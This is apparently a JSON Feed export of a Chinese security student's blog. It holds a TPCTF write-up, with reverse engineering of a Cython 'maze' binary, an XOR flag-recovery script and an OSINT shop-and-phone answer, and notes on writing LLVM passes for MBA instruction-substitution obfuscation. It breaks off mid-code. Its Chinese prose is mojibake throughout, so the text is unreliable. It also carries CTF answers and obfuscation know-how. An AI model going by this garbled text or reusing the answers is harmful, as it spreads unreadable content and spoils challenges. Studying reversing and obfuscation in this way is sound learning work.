{
    "version": "https://jsonfeed.org/version/1",
    "title": "3clyã®åšå®¢ â€¢ All posts by \"å­¦ä¹ \" category",
    "description": "ä¸€åªèœç‹—çš„åšå®¢",
    "home_page_url": "https://3cly.github.io",
    "items": [
        {
            "id": "https://3cly.github.io/2023/12/26/TPCTF/",
            "url": "https://3cly.github.io/2023/12/26/TPCTF/",
            "title": "llvmpasså­¦ä¹ åŠæŒ‡ä»¤æ›¿æ¢",
            "date_published": "2023-12-26T07:39:34.000Z",
            "content_html": "<h1 id=\"tpctf\"><a class=\"markdownIt-Anchor\" href=\"#tpctf\">#</a> TPCTF</h1>\n<h2 id=\"maze\"><a class=\"markdownIt-Anchor\" href=\"#maze\">#</a> maze</h2>\n<p>Welcome to the world of Maze!</p>\n<p>ä¸Šåˆ 9 ç‚¹ä¸‹äº†é™„ä»¶è§£åŒ…äº†å‡ºäº† so æ–‡ä»¶ 10 ç‚¹å‡ºå»å¸®å®¤å‹å¿™äº† ä¸‹åˆå›æ¥å‘ç°é¢˜å·²ç»è¢«å­¦é•¿æ‹¿ä¸‹ä¸‰è¡€äº† tql</p>\n<p>æ•…åœ¨èµ›åå¤ç°ä¸€ä¸‹</p>\n<pre><code>objcopy --dump-section pydata=maze.dump maze\n\npython pyinstxtractor.py maze.dump#å¾—soæ–‡ä»¶\n</code></pre>\n<p>python è¿è¡Œï¼Œé™„åŠ è°ƒè¯• so æ–‡ä»¶ (åœ¨_Py_Dealloc å¯ä»¥æ–­ä¸‹)</p>\n<p>çœ‹å‡ºæ¥æ˜¯ cpython é€†å‘ï¼Œé‡ç‚¹å‡½æ•°å…ˆçœ‹_pyx_pymod_exec_maze</p>\n<p><img data-src=\"/images/image-20231125150951587.png\" alt=\"image-20231125150951587\"></p>\n<p>è°ƒè¯•å¯æ¥åˆ°_pyx_pw_4maze_3c29sdmU å‡½æ•°</p>\n<p><img data-src=\"/images/image-20231129213516487.png\" alt=\"image-20231129213516487\"></p>\n<p>v29 æ˜¯è¾“å…¥çš„é•¿åº¦ è¯´æ˜è¾“å…¥é•¿åº¦æ˜¯ 33</p>\n<p>(äº†è§£ python3 æ•´æ•°ç±»å‹ PyLongObject å’Œ PyObject)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNjUzNzUxODU=\">https://zhuanlan.zhihu.com/p/165375185</span></p>\n<p><code>PyObject</code>  å¯è¯´æ˜¯ CPython æœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„äº†ï¼Œåœ¨ Python çš„ä¸–ç•Œé‡Œï¼Œå‡ ä¹ä»»ä½•å…ƒç´ éƒ½æ˜¯ PyObject çš„æŒ‡é’ˆï¼ˆæ³¨æ„è¿™é‡Œæ˜¯æŒ‡é’ˆï¼Œä¸æ˜¯å®é™…å†…å­˜ç©ºé—´ï¼‰</p>\n<p><img data-src=\"/images/image-20231201174145192.png\" alt=\"image-20231201174145192\"></p>\n<p><img data-src=\"/images/image-20231129220843758.png\" alt=\"image-20231129220843758\"></p>\n<p>_pyx_pw_4maze_5run å‡½æ•° pyx_tuple__28 æ‰“å°å¤±è´¥</p>\n<p>å›åˆ°_pyx_pw_4maze_3c29sdmU å‡½æ•° è®©è¾“å…¥é•¿åº¦æ˜¯ 33 ç»§ç»­è°ƒè¯•å‘ç°</p>\n<p><img data-src=\"/images/image-20231201181822158.png\" alt=\"image-20231201181822158\"></p>\n<p>v52 æ˜¯å–äº†è¾“å…¥çš„ä¸€ä½ ç„¶åèµ‹å€¼ç»™ once1nput (once1nput = PyLong_FromLong (v52)ğŸ˜‰ ä¸€æ¬¡å–ä¸€ä½</p>\n<p><img data-src=\"/images/image-20231201181647688.png\" alt=\"image-20231201181647688\"></p>\n<p>å‘ç°æœ‰ä¸€ä¸ªå¼‚æˆ–å‰ä¸€ä¸ªæ˜¯ä¸€æ¬¡å–çš„ä¸€ä¸ªè¾“å…¥ åä¸€ä¸ªæ˜¯å·²çŸ¥æ•°æ®</p>\n<p><img data-src=\"/images/image-20231201175837641.png\" alt=\"image-20231201175837641\"></p>\n<p>ç»§ç»­è°ƒè¯• æœ‰ä¸€ä¸ª PyObject_RichCompare è¿™é‡Œ v65 æ˜¯æ¯”è¾ƒæ•°æ®</p>\n<p><img data-src=\"/images/image-20231201175926202.png\" alt=\"image-20231201175926202\"></p>\n<p><img data-src=\"/images/image-20231201182520366.png\" alt=\"image-20231201182520366\"></p>\n<p>(ç¬¬å››è¡Œçš„æ‰æ˜¯æ•°æ®)</p>\n<p>é€»è¾‘å¤§æ¦‚å°±æ˜¯å¼‚æˆ– å†å¯¹æ¯” è¿›è¡Œ 33 æ¬¡ (æ¯ä¸€æ¬¡æ¯”è¾ƒè‹¥ä¸å¯¹å°±ä¼šé€€å‡º)</p>\n<p>TPCTF {asdasdasdasdasdasdasdasdasd (æµ‹è¯•æ•°æ®)</p>\n<p>ç†æ¸…é€»è¾‘åå¤šè°ƒè¯•å‡ æ¬¡æœ€åä¼šå‘ç°å…¶å®å¼‚æˆ–çš„æ˜¯ &quot;HITPCTF&quot;</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3e</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">\"HITPCTF\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">cmp</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"å°tçš„æ—¥å¸¸\"><a class=\"markdownIt-Anchor\" href=\"#å°tçš„æ—¥å¸¸\">#</a> å° T çš„æ—¥å¸¸</h2>\n<p>é¢˜ç›®æè¿°æœ¬é¢˜ flag çš„æ­£åˆ™è¡¨è¾¾å¼ä¸º  <code>TPCTF\\\\&#123;[A-Z]+:\\\\d+\\\\&#125;</code> ï¼Œå…¶ä¸­  <code>[A-Z]+</code>  ä¸ºå° T å®¶æ¥¼ä¸‹å•†åº—è¡—çš„ä¸€å…ƒåº—éš”å£çš„æœè£…åº—åº—åï¼Œ <code>\\\\d+</code>  ä¸ºè¿™å®¶æœè£…åº—çš„ç”µè¯å·ç </p>\n<p>ç›´æ¥æŠŠå›¾ç‰‡ä¸­çš„åœ°ç‚¹ç¤¾å·¥å‡ºæ¥åœ¨è¿™å„¿ æœå¯»é™„è¿‘çš„å…³é”®è¯å•†åº—è¡—é‡Œæœ‰ä¸€å…ƒåº—ä¸”éš”å£æœ‰æœè£…åº—çš„å³å¯</p>\n<p><img data-src=\"/images/image-20231201191937628.png\" alt=\"image-20231201191937628\"></p>\n<p><img data-src=\"/images/image-20231201192005252.png\" alt=\"image-20231201192005252\"></p>\n<p><img data-src=\"/images/image-20231201192040083.png\" alt=\"image-20231201192040083\"></p>\n<p>(å•†åº—æ¯”è¾ƒè€ç½‘ä¸Šæ²¡æœ‰ç”µè¯ åªæœ‰å›¾ç‰‡é‡Œæ‰èƒ½çœ‹åˆ°)</p>\n<p narukiya:2311855>å¾—å‡º flag ä¸º TPCTF</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/",
            "url": "https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/",
            "title": "llvmpasså­¦ä¹ åŠæŒ‡ä»¤æ›¿æ¢",
            "date_published": "2023-12-26T07:39:33.000Z",
            "content_html": "<h1 id=\"llvm-pass\"><a class=\"markdownIt-Anchor\" href=\"#llvm-pass\">#</a> LLVM Pass</h1>\n<h3 id=\"llvmåŸºç¡€éšä¾¿å†™å†™\"><a class=\"markdownIt-Anchor\" href=\"#llvmåŸºç¡€éšä¾¿å†™å†™\">#</a> LLVM åŸºç¡€ (éšä¾¿å†™å†™)</h3>\n<p><strong>Compilers ç¼–è¯‘å™¨æ€»ä½“ç»“æ„</strong></p>\n<ul>\n<li>\n<p>Lexical Analysis è¯æ³•åˆ†æ</p>\n</li>\n<li>\n<p>Parsing è¯­æ³•åˆ†æ</p>\n</li>\n<li>\n<p>Semantic Analysis è¯­ä¹‰åˆ†æ (ä¸»è¦)</p>\n<p><strong>---------- å‰ç«¯ ----------</strong></p>\n</li>\n<li>\n<p>Optimization ä¼˜åŒ– (ä¸»è¦)</p>\n<p><strong>---------- åç«¯ ----------</strong></p>\n</li>\n<li>\n<p>Code Generation ä»£ç ç”Ÿæˆ</p>\n</li>\n</ul>\n<p>LLVM ç¼–è¯‘å™¨ç»“æ„å¦‚ä¸‹å›¾</p>\n<p>![image-1692164511976 (1)](/images/image-1692164511976 (1).png)</p>\n<p>ä¼˜ç‚¹ï¼šé€šç”¨çš„ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰æ¥è¡¨ç¤ºç¨‹åºçš„ç»“æ„å’Œè¡Œä¸º</p>\n<h3 id=\"ç¯å¢ƒé…ç½®\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒé…ç½®\">#</a> ç¯å¢ƒé…ç½®</h3>\n<p>å®˜æ–¹æ•™ç¨‹ï½ï½ï½ï½</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWw=\">https://llvm.org/docs/WritingAnLLVMPass.html</span></p>\n<p><s>ä¸€å¼€å§‹æˆ‘è¿˜ç¼–è¯‘ llvm-projectâ€¦ ä¸­é€”è¿˜é‡åˆ°äº† git clone æ–‡ä»¶è¿‡å¤§çš„é—®é¢˜â€¦ æœæ–­æ”¾å¼ƒ</s></p>\n<p><strong>Ubantu apt</strong></p>\n<h4 id=\"åœ¨-ubuntu-ä¸Šå®‰è£…-llvm-17\"><a class=\"markdownIt-Anchor\" href=\"#åœ¨-ubuntu-ä¸Šå®‰è£…-llvm-17\">#</a> åœ¨ Ubuntu ä¸Šå®‰è£… LLVM 17</h4>\n<pre><code>wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add -\nsudo apt-add-repository &quot;deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main&quot;\nsudo apt-get update\nsudo apt-get install -y llvm-17 llvm-17-dev llvm-17-tools clang-17\n</code></pre>\n<p><strong>è¿™å°†å®‰è£…æ‰€æœ‰å¿…éœ€çš„å¤´æ–‡ä»¶ã€åº“å’Œå·¥å…·è·¯å¾„ä¸º  <code>/usr/lib/llvm-17/</code> ã€‚</strong></p>\n<p>æŸ¥æ‰¾å®‰è£…è·¯å¾„</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mou@mou-virtual-machine:~/æ¡Œé¢$ <span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mou@mou-virtual-machine:~$ <span class=\"token builtin class-name\">cd</span> /usr/include</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mou@mou-virtual-machine:/usr/include$ <span class=\"token function\">ls</span> llvm*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>llvm-17:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>llvm</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>llvm-c-17:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>llvm-c</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mou@mou-virtual-machine:/usr/include$ <span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mou@mou-virtual-machine:/usr$ <span class=\"token builtin class-name\">cd</span> lib</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mou@mou-virtual-machine:/usr/lib$ <span class=\"token function\">ls</span> llvm-17/</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>bin  build  cmake  include  lib  share</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>mou@mou-virtual-machine:/usr/lib$</pre></td></tr></table></figure><p><strong>CMake ç¼–è¯‘ç›¸å…³</strong></p>\n<p><s>ä½¿ç”¨ cmake çš„ find_library</s></p>\n<p>cmake å­¦ä¹ ä¹‹å‰æœ‰è®°å½• è¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†</p>\n<p>apt å®‰è£…çš„ï¼Œä½ è®©ä»–æ‰¾å¾—åˆ° llvm å°±è¡Œ ()</p>\n<p><strong>å‘</strong></p>\n<p>ä¹‹å‰æˆ‘ apt è£…å¥½ llvm ä¹Ÿæ˜ç™½äº†å®‰è£…è·¯å¾„å°±åœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº† pass ä»£ç ç¼–è¯‘ ç»“æœæŒ‰ç…§ç»™çš„å‘½ä»¤è¿è¡Œåæ²¡æœ‰ä»»ä½•å›æ˜¾ é—®äº†å¤§ä½¬æ‰å‘ç°å¤åˆ¶çš„ä»£ç æ˜¯ leagct pass ä¸åº”è¯¥æ˜¯ -fpass-plugin è½½å…¥æ’ä»¶â€¦ äºæ˜¯å¼•å‡ºäº†æˆ‘å¯¹æ–°ç‰ˆç®¡ç†å™¨çš„å­¦ä¹ â€¦</p>\n<p>12.12 åœ¨åŠ è£…ä¸€ä¸ª T å›ºæ€åå…ˆå·²ç»ä» VMware è½¬æˆ˜ WSL<img data-src=\"/images/image-20231212203609259.png\" alt=\"image-20231212203609259\"></p>\n<h3 id=\"pass\"><a class=\"markdownIt-Anchor\" href=\"#pass\">#</a> PASS</h3>\n<p><strong>LLVM Pass</strong> æ¡†æ¶æ˜¯ LLVM æä¾›ç»™ç”¨æˆ·ç”¨æ¥å¹²é¢„ä»£ç ä¼˜åŒ–è¿‡ç¨‹çš„æ¡†æ¶ï¼Œç¼–è¯‘åçš„ LLVM Pass é€šè¿‡ä¼˜åŒ–å™¨ opt è¿›è¡ŒåŠ è½½ï¼Œå¯ä»¥å¯¹ LLVM IR ä¸­é—´ä»£ç è¿›è¡Œåˆ†æå’Œä¿®æ”¹ï¼Œç”Ÿæˆæ–°çš„ä¸­é—´ä»£ç ã€‚  åœ¨å®ç°ä¸Šï¼ŒLLVM çš„æ ¸å¿ƒåº“ä¸­ä¼šç»™ä½ ä¸€äº› Pass ç±» å»ç»§æ‰¿ã€‚ä½ éœ€è¦å®ç°å®ƒçš„ä¸€äº›æ–¹æ³•ã€‚  æœ€åä½¿ç”¨ LLVM çš„ç¼–è¯‘å™¨ä¼šæŠŠå®ƒç¿»è¯‘å¾—åˆ°çš„ IR ä¼ å…¥ Pass é‡Œï¼Œç»™ä½ éå†å’Œä¿®æ”¹ã€‚</p>\n<p>LLVM IR å®é™…ä¸Šæœ‰ä¸‰ç§è¡¨ç¤ºï¼š</p>\n<ol>\n<li>.ll æ ¼å¼ï¼šäººç±»å¯ä»¥é˜…è¯»çš„æ–‡æœ¬ã€‚</li>\n<li>.bc æ ¼å¼ï¼šé€‚åˆæœºå™¨å­˜å‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li>\n<li>å†…å­˜è¡¨ç¤º</li>\n</ol>\n<p>é¦–å…ˆï¼Œ.ll æ ¼å¼å’Œ.bc æ ¼å¼æ˜¯å¦‚ä½•ç”Ÿæˆå¹¶ç›¸äº’è½¬æ¢çš„å‘¢ï¼Ÿä¸‹é¢æˆ‘åˆ—äº†ä¸ªå¸¸ç”¨çš„ç®€å•æŒ‡ä»¤æ¸…å•ï¼š</p>\n<ul>\n<li>.c -&gt; .llï¼š <code>clang -emit-llvm -S a.c -o a.ll</code></li>\n<li>.c -&gt; .bc:  <code>clang -emit-llvm -c a.c -o a.bc</code></li>\n<li>.ll -&gt; .bc:  <code>llvm-as a.ll -o a.bc</code></li>\n<li>.bc -&gt; .ll:  <code>llvm-dis a.bc -o a.ll</code></li>\n<li>.bc -&gt; .s:  <code>llc a.bc -o a.s</code></li>\n</ul>\n<p>å¯ä»¥çœ‹åˆ°ï¼Œ <code>clang</code>  é€šè¿‡ <code>-emit-llvm</code>  å‚æ•°ï¼Œ ä½¿å¾—åŸæœ¬è¦ç”Ÿæˆæ±‡ç¼–ä»¥åŠæœºå™¨ç çš„æŒ‡ä»¤ç”Ÿæˆäº† LLVM IR çš„ ll æ ¼å¼å’Œ bc æ ¼å¼ã€‚ è¿™å¯ä»¥ç†è§£ä¸ºï¼šå¯¹äº LLVM IR æ¥è¯´ï¼Œ.ll æ–‡ä»¶å°±ç›¸å½“äºæ±‡ç¼–ï¼Œ.bc æ–‡ä»¶å°±ç›¸å½“äºæœºå™¨ç ã€‚ è¿™ä¹Ÿæ˜¯ <code>llvm-as</code>  å’Œ <code>llvm-dis</code>  æŒ‡ä»¤ä¸ºä»€ä¹ˆå« <code>as</code>  å’Œ <code>dis</code>  çš„ç¼˜æ•…ã€‚</p>\n<p>LLVM æœ‰å¤šç§ç±»å‹çš„ Pass å¯ä¾›é€‰æ‹©ï¼ŒåŒ…æ‹¬ï¼šModulePass (åŸºäºæ¨¡å—)ã€FunctionPass (åŸºäºå‡½æ•°)ã€CallGraphPass (åŸºäºè°ƒç”¨å›¾)ã€LoopPass (åŸºäºå¾ªç¯) ç­‰</p>\n<p>å‚è€ƒå­¦ä¹ çš„å¥½ğŸ‘é¡¹ç›®:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JhbmFjaC1zcGFjZS9sbHZtLXR1dG9y\">https://github.com/banach-space/llvm-tutor</span>  llvm-17 æ–°ç‰ˆç®¡ç†å™¨</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>clang-17 <span class=\"token parameter variable\">-O1</span> -emit-llvm input.c <span class=\"token parameter variable\">-S</span> <span class=\"token parameter variable\">-o</span> out.ll  <span class=\"token comment\">#å¾—.ll æ–‡ä»¶</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/usr/lib/llvm-17/bin/opt -load-pass-plugin ./libHelloWorld.so <span class=\"token parameter variable\">-passes</span><span class=\"token operator\">=</span>hello-world -disable-output out.ll</pre></td></tr></table></figure><p><img data-src=\"/images/image-20231123203845145.png\" alt=\"image-20231123203845145\"></p>\n<p>ä¸€ä¸ª hello world çš„ <strong>FunctionPass</strong>ï¼ŒåŸºäºå‡½æ•°çš„ Pass æ‰“å°å‡½æ•°åç§°å’Œå‚æ•°æ•°é‡</p>\n<p>åç»­ä¼  github</p>\n<h3 id=\"llvm-irå­¦ä¹ ç•¥\"><a class=\"markdownIt-Anchor\" href=\"#llvm-irå­¦ä¹ ç•¥\">#</a> LLVM IR å­¦ä¹  (ç•¥)</h3>\n<p>LLVM IR æ˜¯ä¸€é—¨ä½çº§ç¼–ç¨‹è¯­è¨€ è¯­æ³•ç±»ä¼¼äºæ±‡ç¼–</p>\n<h3 id=\"cscd70\"><a class=\"markdownIt-Anchor\" href=\"#cscd70\">#</a> CSCD70</h3>\n<p>cscd70 ä½œä¸šå¯ä»¥åšåš</p>\n<h3 id=\"è‡ªå·±å†™passå®ç°ollvmä¹‹æŒ‡ä»¤æ›¿ä»£\"><a class=\"markdownIt-Anchor\" href=\"#è‡ªå·±å†™passå®ç°ollvmä¹‹æŒ‡ä»¤æ›¿ä»£\">#</a> è‡ªå·±å†™ pass å®ç° OLLVM ä¹‹æŒ‡ä»¤æ›¿ä»£</h3>\n<p>ä¹‹å‰åš csapp çš„ datalab å°±å‘ç°ç®—æ•°è¿ç®—å­˜åœ¨ä¸€äº›æ’ç­‰å¼ï¼Œè‹¥èƒ½æ›¿æ¢ä¹Ÿç®—æ˜¯ä¸€ç§æ··æ·†å§ åé¢äº†è§£ OLLVM ä¹‹åå°±æƒ³ç€è‡ªå·±å®ç°ä¸€ä¸‹</p>\n<p><strong>å‡æ³•:a - b == (a + ~b) + 1</strong></p>\n<p><strong>åŠ æ³•:a + b == (((a ^ b) + 2 * (a &amp; b)) * 39 + 23) * 151 + 111</strong> (ä»…é™ byte)</p>\n<p><em><em>å¼‚æˆ–:x^y==x-y-2</em>(x|~y)-2</em>*</p>\n<p>â€‹        <s>1.(a|b)&amp;(<sub>a|</sub>b)</s><br>\nâ€‹        <s>2.<sub>(</sub>a&amp;<sub>b)&amp;</sub>(a&amp;b)</s><br>\nâ€‹        <s>3.(a&amp;<sub>b)|(</sub>a&amp;b)</s></p>\n<h4 id=\"mbasub\"><a class=\"markdownIt-Anchor\" href=\"#mbasub\">#</a> MBASub</h4>\n<p>æ··åˆå¸ƒå°”ç®—æœ¯ï¼ˆMixed Boolean-Arithmetic, MBAï¼‰æ˜¯ä¸€ç§æ··æ·†ç®—æ³•ï¼Œè¿™ç§ç®—æ³•ç”±ç®—æ•°è¿ç®—ï¼ˆä¾‹å¦‚ ADDã€SUBã€MULï¼‰å’Œå¸ƒå°”è¿ç®—ï¼ˆä¾‹å¦‚ ANDã€ORã€NOTï¼‰çš„æ··åˆä½¿ç”¨ç»„æˆã€‚å…·ä½“å‚è€ƒ https://bbs.kanxue.com/thread-271574.htm (çº¿æ€§ MBA)</p>\n<p>PASS æ³¨å†Œæ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯ä¿®æ”¹ PassRegistry.def å’Œ PassBuilder.cpp æ–‡ä»¶ï¼Œç›´æ¥è¿½åŠ  Pass å®šä¹‰è¿›å»ã€‚ç¬¬äºŒç§æ˜¯ç”¨æ’ä»¶æ¥å£è¿›è¡Œæ³¨å†Œï¼Œä¹Ÿæ˜¯æˆ‘ä½¿ç”¨çš„æ–¹å¼</p>\n<p><s>è§£æä¸€ä¸ªèƒ½è·‘é€šçš„ pass çš„ç»„æˆéƒ¨åˆ†</s></p>\n<h5 id=\"llvmgetpassplugininfo-è·å–ç›¸å…³ä¿¡æ¯\"><a class=\"markdownIt-Anchor\" href=\"#llvmgetpassplugininfo-è·å–ç›¸å…³ä¿¡æ¯\">#</a> llvmGetPassPluginInfo è·å–ç›¸å…³ä¿¡æ¯</h5>\n<p>llvm ç›¸å…³å‡½æ•° google ä¸€ä¸‹æœ‰å®˜ç½‘ä»‹ç»</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// New PM Registration å†™ pass å¥—è¿™ä¸ªå°±è¡Œ </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token string\">\"C\"</span> LLVM_ATTRIBUTE_WEAK <span class=\"token double-colon punctuation\">::</span>llvm<span class=\"token double-colon punctuation\">::</span>PassPluginLibraryInfo</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">llvmGetPassPluginInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span>LLVM_PLUGIN_API_VERSION<span class=\"token punctuation\">,</span> <span class=\"token string\">\"mba-sub\"</span><span class=\"token punctuation\">,</span> LLVM_VERSION_STRING<span class=\"token punctuation\">,</span><span class=\"token comment\">//llvm ç‰ˆæœ¬å·ç¯å¢ƒå–å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯æ’ä»¶åå­—ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ’ä»¶ç‰ˆæœ¬å·éƒ½æ˜¯éšä¾¿ä¼ </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>PassBuilder <span class=\"token operator\">&amp;</span>PB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>   <span class=\"token comment\">// ç¬¬å››ä¸ªå‚æ•°æ¯”è¾ƒé‡è¦ï¼Œå›è°ƒå‡½æ•°ä¼ é€’ PassBuilder &amp;PB å¯¹è±¡</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            PB<span class=\"token punctuation\">.</span><span class=\"token function\">registerPipelineParsingCallback</span><span class=\"token punctuation\">(</span>   </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>StringRef Name<span class=\"token punctuation\">,</span> FunctionPassManager <span class=\"token operator\">&amp;</span>FPM<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                   ArrayRef<span class=\"token operator\">&lt;</span>PassBuilder<span class=\"token double-colon punctuation\">::</span>PipelineElement<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Name <span class=\"token operator\">==</span> <span class=\"token string\">\"mba-sub\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                    FPM<span class=\"token punctuation\">.</span><span class=\"token function\">addPass</span><span class=\"token punctuation\">(</span><span class=\"token function\">MBASub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                      <span class=\"token comment\">//FPM.addPass (MBASub ()) è¿™è¡Œä»£ç å‘å‡½æ•°çº§åˆ« Pass ç®¡ç†å™¨ FPM ä¸­æ·»åŠ äº†ä¸€ä¸ª MBASub Pass çš„å®ä¾‹ã€‚åœ¨è¿™é‡Œï¼ŒMBASub () è¡¨ç¤ºåˆ›å»ºäº† MBASub ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹ (é»˜è®¤æ„é€ 